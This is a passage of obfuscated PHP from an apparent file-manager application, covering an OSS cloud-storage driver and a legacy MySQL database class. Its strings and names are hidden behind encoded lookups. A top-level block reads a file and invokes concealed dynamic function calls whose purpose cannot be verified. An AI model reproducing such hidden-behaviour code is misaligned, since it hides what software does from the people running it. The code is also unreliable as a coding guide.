$this->fileList($Û©›«ƒš‹, $·¶Óû×íş¶Í[33], !0); $İº = array(); foreach ($¨§[$·¶Óû×íş¶Í[74]] as $¥³“) { $İº[$¥³“[$·¶Óû×íş¶Í[28]]] = $¥³“[$·¶Óû×íş¶Í[78]]; } foreach ($¨§[$·¶Óû×íş¶Í[75]] as $¥³“) { if (is_string($¥³“)) { $İº[$¥³“] = 0; } } return $this->listAllFiles($Û©›«ƒš‹, array_keys($İº), $İº); } public function canRead($ëƒ“Å) { $ò™ Ï =& $_SERVER[èÍ×öˆøÉ]; $¥¨˜Ø…Æà·ğ÷ = $this->pathAcl($ëƒ“Å); return $¥¨˜Ø…Æà·ğ÷ == $ò™ Ï[1334] || $¥¨˜Ø…Æà·ğ÷ == $ò™ Ï[544] ? !0 : !1; } public function canWrite($Êİƒ†ğ˜–) { $·“ÑÅ = $this->pathAcl($Êİƒ†ğ˜–); return $·“ÑÅ == $_SERVER[èÍ×öˆøÉ][544] ? !0 : !1; } public function pathAcl($±Éö‰µ) { $•Ï™­´Ìµ =& $_SERVER[èÍ×öˆøÉ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÌçÄê×‘ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($±Éö‰µ)); } catch (OSS\Core\OssException $Ëâ) { return !1; } $¡Èæ„ = $ÌçÄê×‘ == $•Ï™­´Ìµ[34] ? $this->bucketAcl : $ÌçÄê×‘; if ($¡Èæ„ == $•Ï™­´Ìµ[1335]) { return $•Ï™­´Ìµ[1334]; } if ($¡Èæ„ == $•Ï™­´Ìµ[1336]) { return $•Ï™­´Ìµ[544]; } return $¡Èæ„; } private function chmodPath($²ĞÄ—İø, $’èµì°÷ûÖ = '') { $…‘Å•·¶“é— =& $_SERVER[èÍ×öˆøÉ]; $çÄ°õ­ = empty($’èµì°÷ûÖ) ? $…‘Å•·¶“é—[1336] : $’èµì°÷ûÖ; $®Õ®õ÷±£ = array($…‘Å•·¶“é—[34], $…‘Å•·¶“é—[192], $…‘Å•·¶“é—[1335], $…‘Å•·¶“é—[1336]); if (!in_array($çÄ°õ­, $®Õ®õ÷±£)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($²ĞÄ—İø), $çÄ°õ­); } catch (OSS\Core\OssException $å¾¤ñ’ĞôËÏ©) { return !1; } return !0; } public function getContent($“¹Æû¨ñº ) { return $this->fileSubstr($“¹Æû¨ñº , -1); } public function setContent($Ì ß‹…, $‚éèô‡¥ = '') { $·®Ğ =& $_SERVER[èÍ×öˆøÉ]; try { $¥ñ = $this->trafficLimit($·®Ğ[1337]); $Ğö…ã± = $this->client->putObject($this->bucket, $this->pathEncode($Ì ß‹…), $‚éèô‡¥, $¥ñ); } catch (OSS\Core\OssException $™í‚»ùÎØ€) { return !1; } $ùÀ•ğúüù“ = array($·®Ğ[1327] => trim($Ğö…ã±[$·®Ğ[1338]], $·®Ğ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ì ß‹…))); $this->updateObjMeta($Ì ß‹…, $ùÀ•ğúüù“); return isset($Ğö…ã±[$·®Ğ[1339]][$·®Ğ[1286]]) ? !0 : !1; } private function updateObjMeta($ŒŸû£Á, $¬×øŞÏş½Ö ) { $ŒŸû£Á = $this->pathEncode($ŒŸû£Á); try { $«±†¼Äˆ = array(OSS\OssClient::OSS_HEADERS => $¬×øŞÏş½Ö ); $this->client->copyObject($this->bucket, $ŒŸû£Á, $this->bucket, $ŒŸû£Á, $«±†¼Äˆ); } catch (OSS\Core\OssException $Õ¶) { return !1; } return !0; } public function upload($¹‰Î’ñŒ, $¥»Ù÷óÓï, $ÃÛÑ = false, $ñóªÛ¾¯ = REPEAT_REPLACE) { $‰Ô»ûà =& $_SERVER[èÍ×öˆøÉ]; $Ò×œÉà÷ùşâ = trim($¹‰Î’ñŒ, $‰Ô»ûà[8]); $¥„ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($‰Ô»ûà[1327] => @md5_file($¥»Ù÷óÓï)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¹‰Î’ñŒ))); $¥„ = $this->trafficLimit($‰Ô»ûà[1337], $¥„); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ò×œÉà÷ùşâ), $¥»Ù÷óÓï, $¥„); } catch (OSS\Core\OssException $ÁùÏ±ãŒ) { return !1; } return $this->getPathOuter($¹‰Î’ñŒ); } public function getHost() { $¼§ôÆ¦‹†Å =& $_SERVER[èÍ×öˆøÉ]; $²ÀõÂØØ›µ = explode($¼§ôÆ¦‹†Å[177], parent::getHost()); return $²ÀõÂØØ›µ[0] . $¼§ôÆ¦‹†Å[177] . $this->bucket . $¼§ôÆ¦‹†Å[95] . $²ÀõÂØØ›µ[1]; } public function uploadFormData($€™, $ßã = 3600) { $­œ€Ëé†Ú€§„ =& $_SERVER[èÍ×öˆøÉ]; if (!($Åğ‰×ã„Öü = $this->getHost())) { return !1; } $ê¦ê¼œ = $ßã; $¡  = date($­œ€Ëé†Ú€§„[1340], time() + $ê¦ê¼œ); $êÔ°ìƒ¬“Àé = new DateTime($¡ ); $¼ÖæÌØÄ = $êÔ°ìƒ¬“Àé->format(DateTime::ISO8601); $İ¹ç = strpos($¼ÖæÌØÄ, $­œ€Ëé†Ú€§„[294]); $¼ÖæÌØÄ = substr($¼ÖæÌØÄ, 0, $İ¹ç) . $­œ€Ëé†Ú€§„[1341]; $†ˆÜñØ¢º = 1048576000 * 5; $«·‚°Ê× = $this->pathFather($€™); $µô¬ª = array($­œ€Ëé†Ú€§„[1241] => $¼ÖæÌØÄ, $­œ€Ëé†Ú€§„[1242] => array(array($­œ€Ëé†Ú€§„[1342], 0, $†ˆÜñØ¢º), array($­œ€Ëé†Ú€§„[1245], $­œ€Ëé†Ú€§„[1246], $«·‚°Ê×))); $¾¢•ªÆ¼¼¾§Š = base64_encode(json_encode($µô¬ª)); $¡úğ¡‰œ¥› = base64_encode(hash_hmac($­œ€Ëé†Ú€§„[230], $¾¢•ªÆ¼¼¾§Š, $this->secret, !0)); $“èŸ´Œıö = array($­œ€Ëé†Ú€§„[1251] => $¾¢•ªÆ¼¼¾§Š, $­œ€Ëé†Ú€§„[1343] => $this->accessKey, $­œ€Ëé†Ú€§„[1247] => $­œ€Ëé†Ú€§„[1239], $­œ€Ëé†Ú€§„[1344] => $¡úğ¡‰œ¥›, $­œ€Ëé†Ú€§„[175] => $Åğ‰×ã„Öü); $“èŸ´Œıö = $this->trafficLimit($­œ€Ëé†Ú€§„[1337], $“èŸ´Œıö); return $“èŸ´Œıö; } public function multiUploadFormData($ËÛÚ©€å˜Ø¥, $‰½¼éÊûé§— = 3600) { $ã© =& $_SERVER[èÍ×öˆøÉ]; if (!($’ÙÁ¡•÷Ã…ñ = $this->getHost())) { return !1; } $´‚ò®ç õ = $this->trafficLimit($ã©[1337]); $òç¨Æ¬’Ü = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ËÛÚ©€å˜Ø¥), $´‚ò®ç õ); return array($ã©[221] => $òç¨Æ¬’Ü, $ã©[175] => $’ÙÁ¡•÷Ã…ñ . $ã©[8] . $this->pathEncode($ËÛÚ©€å˜Ø¥), $ã©[222] => gmdate($ã©[1345]), $ã©[93] => $ËÛÚ©€å˜Ø¥); } public function multiUploadAuthData($ŠÄø¥üá…„Ú, $¦ÔÂ¯ = array()) { $Ú†Ùç =& $_SERVER[èÍ×öˆøÉ]; $û¸ÏŞ”÷¬­ = isset($¦ÔÂ¯[$Ú†Ùç[222]]) ? $¦ÔÂ¯[$Ú†Ùç[222]] : gmdate($Ú†Ùç[1345]); $æŸ¸ÃÚË… = isset($¦ÔÂ¯[$Ú†Ùç[168]]) ? $¦ÔÂ¯[$Ú†Ùç[168]] : $Ú†Ùç[33]; $­š™ùñ = $ŠÄø¥üá…„Ú; if (isset($¦ÔÂ¯[$Ú†Ùç[93]])) { $­š™ùñ = $¦ÔÂ¯[$Ú†Ùç[93]]; unset($¦ÔÂ¯[$Ú†Ùç[93]]); } if (isset($¦ÔÂ¯[$Ú†Ùç[223]])) { $¦ÔÂ¯[$Ú†Ùç[222]] = $û¸ÏŞ”÷¬­; return $this->listUploadParts($­š™ùñ, $¦ÔÂ¯); } $ì²÷ = array($Ú†Ùç[224], $Ú†Ùç[33], $Ú†Ùç[119], $û¸ÏŞ”÷¬­, "\x78\55\x6f\163\163\x2d\x64\141\164\x65\72{$û¸ÏŞ”÷¬­}", $Ú†Ùç[8] . $this->bucket . $Ú†Ùç[8] . $­š™ùñ . $æŸ¸ÃÚË…); if (strpos($æŸ¸ÃÚË…, $Ú†Ùç[225]) === 0) { $ì²÷[0] = $Ú†Ùç[226]; if ($Ô¨ìÄ¯Î‘ = $this->trafficLimit($Ú†Ùç[1337])) { $­š™ùñ = $Ú†Ùç[1346]; array_splice($ì²÷, 5, 0, $­š™ùñ . $Ú†Ùç[4] . $Ô¨ìÄ¯Î‘[$­š™ùñ]); } } if (isset($¦ÔÂ¯[$Ú†Ùç[227]]) && $¦ÔÂ¯[$Ú†Ùç[227]] == $Ú†Ùç[228]) { $ì²÷[0] = $Ú†Ùç[228]; } if (!empty($¦ÔÂ¯[$Ú†Ùç[1347]])) { $ô¡ƒ²Çæ˜¨ = array_merge(array($ì²÷[4]), $¦ÔÂ¯[$Ú†Ùç[1347]]); sort($ô¡ƒ²Çæ˜¨); $ì²÷[4] = implode($Ú†Ùç[229], $ô¡ƒ²Çæ˜¨); } $í®ØÏ = implode($Ú†Ùç[229], $ì²÷); $ÇıÔÒ©ê = base64_encode(hash_hmac($Ú†Ùç[230], $í®ØÏ, $this->secret, !0)); $«ÔßµÒúÒ = $Ú†Ùç[1311] . $this->accessKey . $Ú†Ùç[4] . $ÇıÔÒ©ê; if (strpos($æŸ¸ÃÚË…, $Ú†Ùç[225]) === 0) { $«ÔßµÒúÒ = array($Ú†Ùç[232] => $«ÔßµÒúÒ, $Ú†Ùç[222] => $û¸ÏŞ”÷¬­); if ($Ô¨ìÄ¯Î‘) { $«ÔßµÒúÒ = array_merge($«ÔßµÒúÒ, $Ô¨ìÄ¯Î‘); } } return $«ÔßµÒúÒ; } public function listUploadParts($¢’½, $Ø€®‘) { $û±é =& $_SERVER[èÍ×öˆøÉ]; $¢Ì’ëÌŠ = parse_url_query($Ø€®‘[$û±é[168]]); $ˆ”ÆÔŠ‰Ò¡ = $this->client->listParts($this->bucket, $this->pathEncode($¢’½), $¢Ì’ëÌŠ[$û±é[221]]); $ÊŒ¯®è³ñâş = $ˆ”ÆÔŠ‰Ò¡->getListPart(); $»Ú‚ò = array(); foreach ($ÊŒ¯®è³ñâş as $‘€˜×£) { $»Ú‚ò[] = array($û±é[1331] => $‘€˜×£->getPartNumber(), $û±é[1332] => trim($‘€˜×£->getETag(), $û±é[116])); } unset($Ø€®‘[$û±é[223]], $Ø€®‘[$û±é[227]]); $À½¼ = $this->multiUploadAuthData($¢’½, $Ø€®‘); if (empty($À½¼)) { return !1; } return array($û±é[232] => $À½¼, $û±é[222] => $Ø€®‘[$û±é[222]], $û±é[234] => $»Ú‚ò); } public function download($×“Š¥é, $ßÆ€Ú‰õ­ƒ) { if ($this->isFolder($×“Š¥é)) { return !1; } try { $şîĞ³èº = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ßÆ€Ú‰õ­ƒ); $şîĞ³èº = $this->trafficLimit($_SERVER[èÍ×öˆøÉ][109], $şîĞ³èº); $this->client->getObject($this->bucket, $this->pathEncode($×“Š¥é), $şîĞ³èº); } catch (OSS\Core\OssException $ªªìãÈ) { return !1; } return $ßÆ€Ú‰õ­ƒ; } public function fileSubstr($×‹‹–ıâ, $ãËøñ‡öÖ„ = 0, $ê—˜ª = false) { if ($ãËøñ‡öÖ„ === -1) { $Å»¤…İ•è = array(); } else { if ($ê—˜ª === !1) { $Îü´¯åü = $this->size($×‹‹–ıâ); } else { $Îü´¯åü = $ãËøñ‡öÖ„ + $ê—˜ª - 1; } $Å»¤…İ•è = array(OSS\OssClient::OSS_RANGE => "{$ãËøñ‡öÖ„}\55{$Îü´¯åü}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($×‹‹–ıâ), $Å»¤…İ•è); } catch (OSS\Core\OssException $»†) { think_exception($»†->getMessage()); return !1; } } private function trafficLimit($º‘Ãî, $ÄÇª = array()) { $Ì´—ê€¾ =& $_SERVER[èÍ×öˆøÉ]; if ($º‘Ãî == $Ì´—ê€¾[1337] && $this->isUploadServer() || $º‘Ãî == $Ì´—ê€¾[109] && $this->isFileOutServer()) { return $ÄÇª; } $¢ = floatval($GLOBALS[$Ì´—ê€¾[6]][$Ì´—ê€¾[88]][$Ì´—ê€¾[107]][$º‘Ãî]) * 1024 * 1024 * 8; if (!$¢) { return $ÄÇª; } $¢ = $¢ < 819200 ? 819200 : ($¢ > 838860800 ? 838860800 : $¢); $ÄÇª[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¢); return $ÄÇª; } public function link($·ÅÖ•‹§, $œÕëÃ”Ç = array()) { $¦šÏëÑ„ÑÏòü =& $_SERVER[èÍ×öˆøÉ]; if (!$this->exist($·ÅÖ•‹§) || $this->isFolder($·ÅÖ•‹§)) { return !1; } try { $œÕëÃ”Ç = $this->trafficLimit($¦šÏëÑ„ÑÏòü[109], $œÕëÃ”Ç); $—˜¥Çö = $this->client->signUrl($this->bucket, $this->pathEncode($·ÅÖ•‹§), 3600 * 12, $¦šÏëÑ„ÑÏòü[228], $œÕëÃ”Ç); return $this->getCdnLink($—˜¥Çö); } catch (OSS\Core\OssException $¼„­ÔæºË) { return !1; } } public function fileOut($ÆÌ‰ã¯, $íÛ°ÍÂ®¢ = false, $¥Úˆ¶Ğ = false, $ìî“ = '') { $øœ¦ì—Ùİ =& $_SERVER[èÍ×öˆøÉ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÆÌ‰ã¯, $íÛ°ÍÂ®¢, $¥Úˆ¶Ğ, $ìî“); } if (!$¥Úˆ¶Ğ) { $¥Úˆ¶Ğ = $this->pathThis($ÆÌ‰ã¯); } $¥Úˆ¶Ğ = rawurlencode($¥Úˆ¶Ğ); $ñ‰áû¯¯ = get_file_mime(get_path_ext($¥Úˆ¶Ğ)); if ($ñ‰áû¯¯ == $øœ¦ì—Ùİ[213]) { return parent::fileOut($ÆÌ‰ã¯, $íÛ°ÍÂ®¢, $¥Úˆ¶Ğ, $ìî“); } $íÛ°ÍÂ®¢ = $íÛ°ÍÂ®¢ ? $øœ¦ì—Ùİ[214] : $øœ¦ì—Ùİ[215]; $ ¼‘‰û = array(OSS\OssClient::OSS_SUB_RESOURCE => $øœ¦ì—Ùİ[1348] . rawurlencode("{$íÛ°ÍÂ®¢}\73\x66\151\154\x65\156\x61\155\145\x3d{$¥Úˆ¶Ğ}")); $ ¼‘‰û[OSS\OssClient::OSS_SUB_RESOURCE] .= $øœ¦ì—Ùİ[1349] . rawurlencode($ñ‰áû¯¯); $Ùªâ¯Ôõûíä = $this->link($ÆÌ‰ã¯, $ ¼‘‰û); $this->fileOutLink($Ùªâ¯Ôõûíä); } public function fileOutServer($Æ€¸²£Äï¨, $üÎÛÚŞå÷ = false, $«Ò‹µ· = false, $ÓÒ’ÒôØû€ = '') { parent::fileOut($Æ€¸²£Äï¨, $üÎÛÚŞå÷, $«Ò‹µ·, $ÓÒ’ÒôØû€); } public function fileOutImage($œ®, $ö´Ô´· = 250) { $©ÌŞı±ùÈ³ôÄ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[èÍ×öˆøÉ][1350] . $ö´Ô´·); $ƒÅÆç = $this->link($œ®, $©ÌŞı±ùÈ³ôÄ); $this->fileOutLink($ƒÅÆç); } public function fileOutImageServer($²ÚÊ­ËŠãÄ©, $ú¢šµ£ = 250) { parent::fileOutImage($²ÚÊ­ËŠãÄ©, $ú¢šµ£); } public function fileOutLink($ïşş‹¤‹ˆ) { $°Ù©À =& $_SERVER[èÍ×öˆøÉ]; if (!$this->isCdnHost() && substr($ïşş‹¤‹ˆ, 0, 7) == $°Ù©À[1254]) { $ïşş‹¤‹ˆ = $°Ù©À[1255] . substr($ïşş‹¤‹ˆ, 7); } header($°Ù©À[159] . $ïşş‹¤‹ˆ); die; } public function hashMd5($ÌØÎà, $´¢ = '') { $åôù¸£ñÈ =& $_SERVER[èÍ×öˆøÉ]; $ÅõêÒ‹¸À = $this->_objectMeta($ÌØÎà); if (!$ÅõêÒ‹¸À) { return $åôù¸£ñÈ[33]; } if (!isset($ÅõêÒ‹¸À[$åôù¸£ñÈ[1327]]) && !empty($´¢)) { $Ÿ„éàÉ”Õ = $this->updateObjMeta($ÌØÎà, array($åôù¸£ñÈ[1327] => $´¢)); $ÅõêÒ‹¸À[$åôù¸£ñÈ[1327]] = $Ÿ„éàÉ”Õ ? $´¢ : $åôù¸£ñÈ[33]; } return isset($ÅõêÒ‹¸À[$åôù¸£ñÈ[1327]]) ? strtolower($ÅõêÒ‹¸À[$åôù¸£ñÈ[1327]]) : $åôù¸£ñÈ[33]; } public function size($¦´“¢Ü’š) { $ö½Õ = $this->objectMeta($¦´“¢Ü’š); return $ö½Õ ? $ö½Õ[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function info($Ì‚ÀÚ§´¼èÕ) { if ($this->isFolder($Ì‚ÀÚ§´¼èÕ)) { return $this->folderInfo($Ì‚ÀÚ§´¼èÕ); } else { if ($this->isFile($Ì‚ÀÚ§´¼èÕ)) { return $this->fileInfo($Ì‚ÀÚ§´¼èÕ); } } return !1; } public function exist($ÃòŸ©) { return $this->isFile($ÃòŸ©) || $this->isFolder($ÃòŸ©); } public function isFile($ÒœŒŸÁØ) { return !$this->isFolder($ÒœŒŸÁØ) && $this->objectMeta($ÒœŒŸÁØ); } public function isFolder($‚ê‰¦) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][199], $‚ê‰¦); } protected function objectMeta($ö»ßß„²¼) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][200], $ö»ßß„²¼); } protected function _objectMeta($ÑÑÌë) { $Õ¿ =& $_SERVER[èÍ×öˆøÉ]; try { $áÈ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÑÑÌë)); } catch (OSS\Core\OssException $Û¥Ï) { $áÈ = !1; } if ($áÈ) { $áÈ[$Õ¿[78]] = intval($áÈ[$Õ¿[1325]]); } return $áÈ; } protected function _isFolder($ĞàÏ“‘›Œ) { $ˆÛ²…ùµ…üã¹ =& $_SERVER[èÍ×öˆøÉ]; if ($ĞàÏ“‘›Œ == $ˆÛ²…ùµ…üã¹[33] || $ĞàÏ“‘›Œ == $ˆÛ²…ùµ…üã¹[8]) { return !0; } $ªŸ¥Ú = array($ˆÛ²…ùµ…üã¹[1321] => $ˆÛ²…ùµ…üã¹[8], $ˆÛ²…ùµ…üã¹[1322] => rtrim($ĞàÏ“‘›Œ, $ˆÛ²…ùµ…üã¹[8]) . $ˆÛ²…ùµ…üã¹[8], $ˆÛ²…ùµ…üã¹[1323] => 1, $ˆÛ²…ùµ…üã¹[1324] => $ˆÛ²…ùµ…üã¹[33]); $ì– = $this->client->listObjects($this->bucket, $ªŸ¥Ú); if ($ì–->getObjectList() || $ì–->getPrefixList()) { return !0; } return !1; } } if ($_SERVER[$_SERVER[èÍ×öˆøÉ][874]] != $_SERVER[$_SERVER[èÍ×öˆøÉ][875]]) { $_getc = $_SERVER[èÍ×öˆøÉ][877]; $_getfile = $_SERVER[$_SERVER[èÍ×öˆøÉ][878]] . $_SERVER[èÍ×öˆøÉ][879]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èÍ×öˆøÉ][229], $_getfilec); if (count($_getarrs) < $_SERVER[èÍ×öˆøÉ][613]) { $exit = $_SERVER[èÍ×öˆøÉ][880]; $exit(); } $_act = $_SERVER[èÍ×öˆøÉ][1351]; $_act($_SERVER[$_SERVER[èÍ×öˆøÉ][1352]]); } goto e§ò¥¶••¼; a·’ğÉóª”: class DbMysql extends Db { public function __construct($ÑÌşÜ¼”©Ÿ­ = '') { $ÃÃÁ—¸ÛĞ =& $_SERVER[èÍ×öˆøÉ]; if (!extension_loaded($ÃÃÁ—¸ÛĞ[796])) { think_exception(think_lang($ÃÃÁ—¸ÛĞ[10]) . $ÃÃÁ—¸ÛĞ[885]); } if (!empty($ÑÌşÜ¼”©Ÿ­)) { $this->config = $ÑÌşÜ¼”©Ÿ­; if (empty($this->config[$ÃÃÁ—¸ÛĞ[13]])) { $this->config[$ÃÃÁ—¸ÛĞ[13]] = $ÃÃÁ—¸ÛĞ[33]; } } } public function connect($ÏŠ— = '', $”…†ó‡ö = 0, $Ø¼ºõ“ = false) { $•†¬íãåó£¤ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->linkID[$”…†ó‡ö])) { if (empty($ÏŠ—)) { $ÏŠ— = $this->config; } $ËØ¡Ù±¥€ = $ÏŠ—[$•†¬íãåó£¤[886]] . ($ÏŠ—[$•†¬íãåó£¤[887]] ? "\72{$ÏŠ—[$•†¬íãåó£¤[887]]}" : $•†¬íãåó£¤[33]); $İş¦ = !empty($ÏŠ—[$•†¬íãåó£¤[13]][$•†¬íãåó£¤[14]]) ? $ÏŠ—[$•†¬íãåó£¤[13]][$•†¬íãåó£¤[14]] : $this->pconnect; if ($İş¦) { $this->linkID[$”…†ó‡ö] = mysql_pconnect($ËØ¡Ù±¥€, $ÏŠ—[$•†¬íãåó£¤[888]], $ÏŠ—[$•†¬íãåó£¤[889]], 131072); } else { $this->linkID[$”…†ó‡ö] = mysql_connect($ËØ¡Ù±¥€, $ÏŠ—[$•†¬íãåó£¤[888]], $ÏŠ—[$•†¬íãåó£¤[889]], !0, 131072); } if (!$this->linkID[$”…†ó‡ö] || !empty($ÏŠ—[$•†¬íãåó£¤[17]]) && !mysql_select_db($ÏŠ—[$•†¬íãåó£¤[17]], $this->linkID[$”…†ó‡ö])) { think_exception(mysql_error()); } $Î¬Éñİ±ù = mysql_get_server_info($this->linkID[$”…†ó‡ö]); mysql_query($•†¬íãåó£¤[890] . think_config($•†¬íãåó£¤[891]) . $•†¬íãåó£¤[55], $this->linkID[$”…†ó‡ö]); if ($Î¬Éñİ±ù > $•†¬íãåó£¤[892]) { mysql_query($•†¬íãåó£¤[893], $this->linkID[$”…†ó‡ö]); } $this->connected = !0; if (1 != think_config($•†¬íãåó£¤[18])) { unset($this->config); } } return $this->linkID[$”…†ó‡ö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‰›¡ÌíÊˆ¾ì) { $Ÿ‰Öøê® =& $_SERVER[èÍ×öˆøÉ]; if (0 === stripos($‰›¡ÌíÊˆ¾ì, $Ÿ‰Öøê®[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰›¡ÌíÊˆ¾ì; if ($this->queryID) { $this->free(); } think_action_status($Ÿ‰Öøê®[19], 1); think_status($Ÿ‰Öøê®[20]); $this->queryID = mysql_query($‰›¡ÌíÊˆ¾ì, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($È‘½Ù™‘—) { $ÓÑ«¬šÈøÍ =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $È‘½Ù™‘—; if ($this->queryID) { $this->free(); } think_action_status($ÓÑ«¬šÈøÍ[21], 1); think_status($ÓÑ«¬šÈøÍ[20]); $²©˜ãé = mysql_query($È‘½Ù™‘—, $this->_linkID); $this->debug(); if (!1 === $²©˜ãé) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[èÍ×öˆøÉ][894], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âşÒ–ø¤ = mysql_query($_SERVER[èÍ×öˆøÉ][895], $this->_linkID); $this->transTimes = 0; if (!$âşÒ–ø¤) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $³ú¶Ë = mysql_query($_SERVER[èÍ×öˆøÉ][896], $this->_linkID); $this->transTimes = 0; if (!$³ú¶Ë) { $this->error(); return !1; } } return !0; } private function getAll() { $§³¸‹ƒ¹ = array(); if ($this->numRows > 0) { while ($©²ÉèÌí× = mysql_fetch_assoc($this->queryID)) { $§³¸‹ƒ¹[] = $©²ÉèÌí×; } mysql_data_seek($this->queryID, 0); } return $§³¸‹ƒ¹; } public function getFields($€ŞÅº²‹î) { $˜ìÚ°ùÀ =& $_SERVER[èÍ×öˆøÉ]; $úŞ¿ª´‹—°Ñ = $this->query($˜ìÚ°ùÀ[897] . $this->parseKey($€ŞÅº²‹î)); $°†Ñş…§İ¹ = array(); if ($úŞ¿ª´‹—°Ñ) { foreach ($úŞ¿ª´‹—°Ñ as $şÑ•Ü³‹ˆ => $Œøå¢ß) { $°†Ñş…§İ¹[$Œøå¢ß[$˜ìÚ°ùÀ[27]]] = array($˜ìÚ°ùÀ[28] => $Œøå¢ß[$˜ìÚ°ùÀ[27]], $˜ìÚ°ùÀ[29] => $Œøå¢ß[$˜ìÚ°ùÀ[30]], $˜ìÚ°ùÀ[31] => (bool) (strtoupper($Œøå¢ß[$˜ìÚ°ùÀ[32]]) === $˜ìÚ°ùÀ[898]), $˜ìÚ°ùÀ[34] => $Œøå¢ß[$˜ìÚ°ùÀ[35]], $˜ìÚ°ùÀ[36] => strtolower($Œøå¢ß[$˜ìÚ°ùÀ[37]]) == $˜ìÚ°ùÀ[38], $˜ìÚ°ùÀ[39] => strtolower($Œøå¢ß[$˜ìÚ°ùÀ[40]]) == $˜ìÚ°ùÀ[41]); } } return $°†Ñş…§İ¹; } public function getTables($–†Í€ëœÔšÜ = '') { $×µØˆø›ÃŸˆ =& $_SERVER[èÍ×öˆøÉ]; if (!empty($–†Í€ëœÔšÜ)) { $‡¬¼¹ñü– = $×µØˆø›ÃŸˆ[899] . $–†Í€ëœÔšÜ . $×µØˆø›ÃŸˆ[900]; } else { $‡¬¼¹ñü– = $×µØˆø›ÃŸˆ[901]; } $ÊôîÏãàÊî = $this->query($‡¬¼¹ñü–); $Ì ìİ†Í = array(); foreach ($ÊôîÏãàÊî as $Ïç” => $Åõ‘) { $Ì ìİ†Í[$Ïç”] = current($Åõ‘); } return $Ì ìİ†Í; } public function replace($Éè, $äÌÁ = array()) { $ëÚ =& $_SERVER[èÍ×öˆøÉ]; foreach ($Éè as $Ş‡ŒÂ => $ÉÄì÷Ğ±×) { $¤»«àË = $this->parseValue($ÉÄì÷Ğ±×); if (is_scalar($¤»«àË)) { $‰°åå[] = $¤»«àË; $ıƒÖ[] = $this->parseKey($Ş‡ŒÂ); } } $âÆ«Şİû‘­ = $ëÚ[902] . $this->parseTable($äÌÁ[$ëÚ[277]]) . $ëÚ[903] . implode($ëÚ[47], $ıƒÖ) . $ëÚ[904] . implode($ëÚ[47], $‰°åå) . $ëÚ[905]; return $this->execute($âÆ«Şİû‘­); } public function insertAll($îõÒ½ÓÔ, $©áê = array(), $‹ëÓé¨ÒööÄ = false) { $é±Â»Š =& $_SERVER[èÍ×öˆøÉ]; if (!is_array($îõÒ½ÓÔ[0])) { return !1; } $ôğ¤è€îÕº = array_keys($îõÒ½ÓÔ[0]); $´°ü¬›¬˜»ú = array(); foreach ($îõÒ½ÓÔ as $‡Ö„ïê¼ƒØç–) { $ÏÍÖóÍÌâ = array(); foreach ($‡Ö„ïê¼ƒØç– as $» ¸ => $­«ôƒó¤­Ï) { $­«ôƒó¤­Ï = $this->parseValue($­«ôƒó¤­Ï); if (is_scalar($­«ôƒó¤­Ï)) { $ÏÍÖóÍÌâ[] = $­«ôƒó¤­Ï; } } $´°ü¬›¬˜»ú[] = $é±Â»Š[258] . implode($é±Â»Š[47], $ÏÍÖóÍÌâ) . $é±Â»Š[905]; } array_walk($ôğ¤è€îÕº, array($this, $é±Â»Š[906])); $»£ø¸°Í = ($‹ëÓé¨ÒööÄ ? $é±Â»Š[907] : $é±Â»Š[908]) . $é±Â»Š[909] . $this->parseTable($©áê[$é±Â»Š[277]]) . $é±Â»Š[903] . implode($é±Â»Š[47], $ôğ¤è€îÕº) . $é±Â»Š[910] . implode($é±Â»Š[47], $´°ü¬›¬˜»ú); return $this->execute($»£ø¸°Í); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ô¦ =& $_SERVER[èÍ×öˆøÉ]; $this->error = mysql_errno() . $Ô¦[4] . mysql_error($this->_linkID); if ($Ô¦[33] != $this->queryStr) { $this->error .= LNG($Ô¦[45]) . $this->queryStr; } think_trace($this->error, $Ô¦[33], $Ô¦[46]); return $this->error; } public function escapeString($òË”éÆûö) { if ($this->_linkID) { return mysql_real_escape_string($òË”éÆûö, $this->_linkID); } else { return mysql_escape_string($òË”éÆûö); } } public function parseKey(&$•ŞÀ ßœâïàĞ, $™ˆÎ÷ñ¤ = true) { $¿²ŒÑôÕ =& $_SERVER[èÍ×öˆøÉ]; if ($™ˆÎ÷ñ¤) { $•ŞÀ ßœâïàĞ = $this->parseKeyCheck($•ŞÀ ßœâïàĞ); } if ($•ŞÀ ßœâïàĞ != $¿²ŒÑôÕ[182] && !preg_match($¿²ŒÑôÕ[911], $•ŞÀ ßœâïàĞ)) { 